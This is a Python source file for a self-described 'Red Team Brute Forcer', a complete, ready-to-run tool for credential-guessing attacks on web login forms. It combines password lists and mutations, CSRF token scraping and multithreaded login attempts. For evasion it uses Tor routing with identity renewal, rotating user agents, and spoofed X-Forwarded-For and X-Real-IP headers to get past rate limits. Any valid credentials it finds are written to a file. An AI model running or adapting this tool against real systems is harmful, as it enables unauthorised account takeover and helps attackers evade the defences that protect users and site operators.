import argparse
import requests
import threading
import time
import random
import sys
import json
import socks
import socket
from queue import Queue, Empty
from bs4 import BeautifulSoup
from stem import Signal
from stem.control import Controller
import re
from threading import Event
from tqdm import tqdm
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from jinja2 import Template
from collections import Counter
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

TOP_COMMON_PASSWORDS = ["123456", "password", "123456789", "admin", "12345678"]
MUTATIONS = ["{}123", "{}@2025", "{}!", "{}#", "{}$", "{}2025"]

class Config:
    def __init__(self, args):
        self.url = args.url
        self.username = args.username
        self.passlist = args.passlist
        self.csrf = args.csrf
        self.proxy = args.proxy
        self.threads = args.threads
        self.fail_flag = args.fail_flag
        self.method = args.method.upper()
        self.headers = json.loads(args.headers) if args.headers else {}
        self.ua_pool = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)",
            "Mozilla/5.0 (Linux; Android 10)"
        ]
        self.proxies = {"http": self.proxy, "https": self.proxy} if self.proxy else None
        self.output_format = args.output_format
        self.output_file = args.output_file
        self.use_tor = args.tor
        self.rate_bypass = args.rate_bypass
        self.mutate = args.mutate

class Logger:
    def __init__(self, fmt="text"):
        self.format = fmt
        self.entries = []
        self.lock = threading.Lock()

    def success(self, msg):
        with self.lock:
            tqdm.write(Fore.GREEN + "[+] " + msg)
            self.entries.append({"timestamp": self.now(), "status": "success", "msg": msg})

    def error(self, msg):
        with self.lock:
            tqdm.write(Fore.RED + "[!] " + msg)

    def log_attempt(self, username, password, status, code):
        with self.lock:
            self.entries.append({
                "timestamp": self.now(),
                "username": username,
                "password": password,
                "status": status,
                "http_code": code
            })

    def now(self):
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def save(self, path):
        try:
            if self.format == "json":
                with open(path, "w") as f:
                    json.dump(self.entries, f, indent=2)
            elif self.format == "csv":
                with open(path, "w") as f:
                    f.write("timestamp,username,password,status,http_code\n")
                    for e in self.entries:
                        if "username" in e:
                            f.write(f"{e['timestamp']},{e['username']},{e['password']},{e['status']},{e['http_code']}\n")
            else:
                with open(path, "w") as f:
                    for e in self.entries:
                        if e.get("status") == "success":
                            f.write(e["msg"] + "\n")
            self.save_html_report("brute_report.html")
        except Exception as e:
            tqdm.write(Fore.YELLOW + f"[!] Failed to save logs: {e}")

    def save_html_report(self, filename):
        template = Template("""
        <html><head><title>Brute Report</title>
        <style>body{font-family:Arial;padding:20px;}
        table{border-collapse:collapse;width:100%;}
        th,td{border:1px solid #ccc;padding:6px;}
        .success{background:#cfc;}
        .failed{background:#fdd;}
        </style></head><body>
        <h2>Brute Force Report</h2>
        <p>Generated: {{ date }}</p>
        <table><tr><th>Time</th><th>User</th><th>Pass</th><th>Status</th><th>Code</th></tr>
        {% for e in log if 'username' in e %}
        <tr class="{{ e.status }}"><td>{{ e.timestamp }}</td><td>{{ e.username }}</td>
        <td>{{ e.password }}</td><td>{{ e.status }}</td><td>{{ e.http_code }}</td></tr>
        {% endfor %}
        </table></body></html>
        """)
        html = template.render(date=self.now(), log=self.entries)
        with open(filename, "w", encoding="utf-8") as f:
            f.write(html)

def renew_tor_identity():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
            tqdm.write(Fore.CYAN + "[*] Tor identity renewed")
    except Exception as e:
        tqdm.write(Fore.YELLOW + f"[!] Tor renewal failed: {e}")

def get_login_fields(url):
    try:
        r = requests.get(url, timeout=10, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        inputs = soup.find_all("input")
        fields = {}
        for i in inputs:
            if i.get("type") in ["text", "email", "password"] and i.get("name"):
                fields[i.get("name")] = ""
        return fields
    except Exception as e:
        tqdm.write(Fore.RED + f"[!] Login form recon failed: {e}")
        return {"username": "", "password": ""}

class BruteForcer:
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger
        self.q = Queue()
        self.load_usernames()
        self.load_passwords()
        self.login_fields = get_login_fields(config.url)
        self.found_event = Event()
        self.update_q = Queue()
        self.stop_updater = Event()
        self.total = self.q.qsize()
        self.progress = tqdm(total=self.total, desc="Brute Progress", ncols=80, colour="green", leave=False)
        if self.config.use_tor:
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket

    def load_usernames(self):
        if self.config.username.endswith(".txt"):
            with open(self.config.username, "r") as f:
                self.usernames = [u.strip() for u in f if u.strip()]
        else:
            self.usernames = [self.config.username]

    def load_passwords(self):
        with open(self.config.passlist, "r", encoding="utf-8", errors="ignore") as f:
            raw = [line.strip() for line in f if line.strip()]
        top = [p for p in TOP_COMMON_PASSWORDS if p in raw]
        others = [p for p in raw if p not in top]
        passwords = top + others
        if self.config.mutate:
            mutated = []
            for p in passwords:
                mutated.extend([m.format(p) for m in MUTATIONS])
            passwords += mutated
        for user in self.usernames:
            for pwd in passwords:
                self.q.put((user, pwd))

    def get_csrf_token(self, session):
        try:
            r = session.get(self.config.url, timeout=10, verify=False)
            soup = BeautifulSoup(r.text, "html.parser")
            token = soup.find("input", {"name": "csrf_token"})
            return token.get("value") if token else None
        except Exception as e:
            self.logger.error(f"CSRF fetch failed: {e}")
            return None

    def detect_defense(self, text):
        for flag in ["captcha", "verify", "/captcha/", "recaptcha"]:
            if re.search(flag, text, re.IGNORECASE):
                self.logger.error("CAPTCHA or 2FA detected. Exiting.")
                self.found_event.set()
                sys.exit(1)

    def apply_rate_limit_bypass(self):
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        return {"X-Forwarded-For": ip, "X-Real-IP": ip, "Forwarded": f"for={ip}"}

    def brute_worker(self):
        session = requests.Session()
        fail_streak = 0
        while not self.q.empty() and not self.found_event.is_set():
            try:
                username, password = self.q.get(timeout=2)
            except Empty:
                break
            headers = {"User-Agent": random.choice(self.config.ua_pool), **self.config.headers}
            if self.config.rate_bypass:
                headers.update(self.apply_rate_limit_bypass())
            data = dict(self.login_fields)
            data["username"] = username
            data["password"] = password
            if self.config.csrf:
                token = self.get_csrf_token(session)
                if token:
                    data["csrf_token"] = token
            try:
                r = session.request(
                    self.config.method,
                    self.config.url,
                    data=data,
                    headers=headers,
                    proxies=self.config.proxies,
                    timeout=10,
                    allow_redirects=False,
                    verify=False
                )
                self.detect_defense(r.text)
                if self.config.fail_flag not in r.text and r.status_code in [200, 302]:
                    self.found_event.set()
                    msg = f"Valid creds: {username}:{password}"
                    self.logger.success(msg)
                    with open("found.txt", "a") as f:
                        f.write(f"{username}:{password}\n")
                    return
                else:
                    self.logger.log_attempt(username, password, "failed", r.status_code)
                    self.update_q.put(1)
                    fail_streak += 1
                    if fail_streak % 10 == 0:
                        time.sleep(random.uniform(1.5, 3.0))
                time.sleep(random.uniform(0.2, 0.6))
            except requests.RequestException as e:
                self.logger.error(f"Request failed: {e}")

    def run(self):
        def progress_updater():
            while not self.stop_updater.is_set():
                try:
                    self.update_q.get(timeout=0.5)
                    self.progress.update(1)
                except Empty:
                    continue
        updater = threading.Thread(target=progress_updater)
        updater.daemon = True
        updater.start()

        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = [executor.submit(self.brute_worker) for _ in range(self.config.threads)]
            try:
                for future in as_completed(futures):
                    if self.found_event.is_set():
                        break
            except KeyboardInterrupt:
                tqdm.write(Fore.YELLOW + "[!] Interrupted by user.")
                self.found_event.set()

        self.stop_updater.set()
        updater.join()
        self.progress.close()
        self.logger.save(self.config.output_file)

        if self.found_event.is_set():
            tqdm.write(Fore.GREEN + "[+] Login success! Check found.txt.")
        else:
            tqdm.write(Fore.RED + "[-] No valid credentials found.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Red Team Brute Forcer - Phase 3")
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-U", "--username", required=True)
    parser.add_argument("-P", "--passlist", required=True)
    parser.add_argument("--csrf", action="store_true")
    parser.add_argument("--proxy", help="Proxy URL")
    parser.add_argument("--threads", type=int, default=10)
    parser.add_argument("--fail-flag", default="Invalid")
    parser.add_argument("--method", default="POST")
    parser.add_argument("--headers", help="Custom headers as JSON")
    parser.add_argument("--tor", action="store_true")
    parser.add_argument("--rate-bypass", action="store_true")
    parser.add_argument("--mutate", action="store_true")
    parser.add_argument("--output-format", default="text", choices=["text", "json", "csv"])
    parser.add_argument("--output-file", default="results.out")
    args = parser.parse_args()

    config = Config(args)
    logger = Logger(fmt=config.output_format)
    brute = BruteForcer(config, logger)
    brute.run()
